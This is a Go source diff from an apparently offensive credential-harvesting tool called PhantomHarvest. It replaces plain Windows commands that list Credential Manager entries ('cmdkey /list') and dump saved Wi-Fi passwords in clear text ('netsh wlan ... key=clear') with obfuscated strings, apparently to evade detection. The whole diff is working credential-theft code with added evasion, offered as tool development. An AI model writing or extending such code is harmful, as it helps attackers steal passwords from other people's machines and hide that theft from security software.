@@ -7,6 +7,8 @@ import (
 	"regexp"
 	"runtime"
 	"strings"
+
+	"github.com/phantom-offensive/PhantomHarvest/internal/obfuscate"
 )
 
 // scanWindows runs Windows-specific credential discovery.
@@ -85,7 +87,9 @@ func (s *Scanner) scanWindows() {
 
 // scanCredentialManager enumerates Windows Credential Manager.
 func (s *Scanner) scanCredentialManager() {
-	out, err := exec.Command("cmdkey", "/list").Output()
+	// Obfuscated: "cmdkey /list"
+	parts := strings.Fields(obfuscate.CmdkeyList())
+	out, err := exec.Command(parts[0], parts[1]).Output()
 	if err != nil {
 		return
 	}
@@ -117,7 +121,9 @@ func (s *Scanner) scanCredentialManager() {
 // scanWiFiPasswords extracts saved Wi-Fi passwords.
 func (s *Scanner) scanWiFiPasswords() {
 	// Get list of profiles
-	out, err := exec.Command("netsh", "wlan", "show", "profiles").Output()
+	// Obfuscated: "netsh wlan show profiles"
+	wlanParts := strings.Fields(obfuscate.NetshWlan())
+	out, err := exec.Command(wlanParts[0], wlanParts[1:]...).Output()
 	if err != nil {
 		return
 	}
@@ -132,8 +138,10 @@ func (s *Scanner) scanWiFiPasswords() {
 		profileName := strings.TrimSpace(match[1])
 
 		// Get password for each profile
-		passOut, err := exec.Command("netsh", "wlan", "show", "profile",
-			"name="+profileName, "key=clear").Output()
+		// Obfuscated: "netsh wlan show profile name=X key=clear"
+		profParts := strings.Fields(obfuscate.NetshProfile())
+		passOut, err := exec.Command(profParts[0], append(profParts[1:],
+			"name="+profileName, obfuscate.KeyClear())...).Output()
 		if err != nil {
 			continue
 		}
